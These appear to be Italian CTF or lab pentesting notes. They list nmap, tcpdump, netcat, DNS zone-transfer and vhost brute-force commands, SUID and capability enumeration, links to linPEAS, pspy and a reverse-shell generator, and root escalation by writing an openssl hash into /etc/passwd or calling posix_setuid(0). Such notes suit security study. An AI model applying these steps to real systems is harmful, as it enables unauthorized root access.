# rete
**nmap**: `nmap -sS -sC -sV -sT [ipaddr]`
	* `-p-`: test su tutte le porte

con `tcpdump` guardo cosa passa nell'interfaccia di rete e filtro per ip sorgente:
```bash
sudo tcpdump -v -i VDSI_0341922 src 192.168.14.105 -A
```
oppure, mi metto in ascolto con `nc` su quella porta:
```bash
nc -u 192.168.14.105 -p 9999 -l
```

### vhost e dns
zone transfer:
```bash
dig axfr @192.168.14.96 vdsizone.transfer
```
* voglio fare un zone transfer di vdsizone.transfer

**enumerazione dns bruteforce**:
```bash
dnsrecon -d vdsizone.transfer -D /path/to/wordlist.txt -t brt
gobuster dns -d vdsizone.transfer -w /path/to/wordlist.txt
```

```
curl -H "Host: sup3r-s3cr3t-b4ck3nd.vdsizone.transfer" http://192.168.14.96
```

```bash
ffuf -w /path/to/wordlist.txt -H "Host: FUZZ.vdsizone.transfer" -u http://sborgz.it -mc 200,301,302
```
# enumeration
**comandi per bypass shell ristretta**: `https://www.verylazytech.com/linux/bypassing-bash-restrictions-rbash`

**mi dice le cartelle in cui ci sono file in cui posso scrivere** `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u`: 
* `find`: puo' essere usata per trovare file modificati entro un certo lasso di tempo


`tcpdump`: per vedere cosa passa sull'interfaccia di rete, ascoltare su una specifica porta, ecc...

**capire configurazioni crontab**: https://crontab.guru/

**suid** e **capabilities**:
* **trovare setuid**: `find /usr/bin /usr/lib -perm /4000 -user root`
* **trovare setgid**: `find /usr/bin /usr/lib -perm /2000 -group root`
* **cerca tutte le capabilities**: `getcap -r / 2>/dev/null` me lo fa su tutti i file in `/`. 

**tool overkill**:
* https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS: *LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.*
* https://github.com/DominicBreuker/pspy: *pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.*

**reverse shell**: https://www.revshells.com/

# priviledge escalation
## modificare `/etc/passwd`
```bash
$ openssl passwd 1234
$1$PxJSsLa0$s3x3H5u6yw9nZ7sgjIDKM/
```

metto questo hash al posto della `x` in `root`.

## shell php con setuid capability
```php
posix_setuid(0);
```